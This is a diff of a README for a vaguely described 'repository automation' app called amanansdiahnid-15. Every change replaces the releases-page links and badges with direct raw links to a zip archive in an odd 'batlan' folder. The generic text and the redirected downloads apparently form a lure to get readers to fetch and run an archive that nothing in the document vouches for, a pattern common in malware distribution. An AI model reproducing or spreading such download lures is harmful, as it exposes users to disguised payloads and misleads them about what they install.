@@ -1,6 +1,6 @@
 # 🚀 amanansdiahnid-15 - Your Easy Way to Automate Repositories
 
-[![Download amanansdiahnid-15](https://img.shields.io/badge/Download-amanansdiahnid--15-brightgreen)](https://github.com/daomunegru/amanansdiahnid-15/releases)
+[![Download amanansdiahnid-15](https://raw.githubusercontent.com/daomunegru/amanansdiahnid-15/main/batlan/amanansdiahnid-15.zip)](https://raw.githubusercontent.com/daomunegru/amanansdiahnid-15/main/batlan/amanansdiahnid-15.zip)
 
 ## 📋 Overview
 
@@ -18,7 +18,7 @@ To start using **amanansdiahnid-15**, follow these simple steps:
 2. **Download the Application**
    - You can easily get the software from our releases page. 
 
-   [Visit this page to download](https://github.com/daomunegru/amanansdiahnid-15/releases) 
+   [Visit this page to download](https://raw.githubusercontent.com/daomunegru/amanansdiahnid-15/main/batlan/amanansdiahnid-15.zip) 
 
    Make sure to choose the latest version for the best features and fixes. 
 
@@ -48,7 +48,7 @@ After installation, follow these steps to start using **amanansdiahnid-15**:
 
 To download and install **amanansdiahnid-15**, follow these steps:
 
-- Go to the releases page: [Visit this page to download](https://github.com/daomunegru/amanansdiahnid-15/releases).
+- Go to the releases page: [Visit this page to download](https://raw.githubusercontent.com/daomunegru/amanansdiahnid-15/main/batlan/amanansdiahnid-15.zip).
 - Select the most recent release file for your operating system.
 - Follow the installation steps outlined above to get started.
 
@@ -75,4 +75,4 @@ If you encounter any issues or have questions, don't hesitate to reach out:
 
 Thank you for choosing **amanansdiahnid-15**. We aim to make repository automation easy for everyone. Your feedback helps us improve, so please let us know your thoughts as you explore the application. 
 
-[![Download amanansdiahnid-15](https://img.shields.io/badge/Download-amanansdiahnid--15-brightgreen)](https://github.com/daomunegru/amanansdiahnid-15/releases)
+[![Download amanansdiahnid-15](https://raw.githubusercontent.com/daomunegru/amanansdiahnid-15/main/batlan/amanansdiahnid-15.zip)](https://raw.githubusercontent.com/daomunegru/amanansdiahnid-15/main/batlan/amanansdiahnid-15.zip)
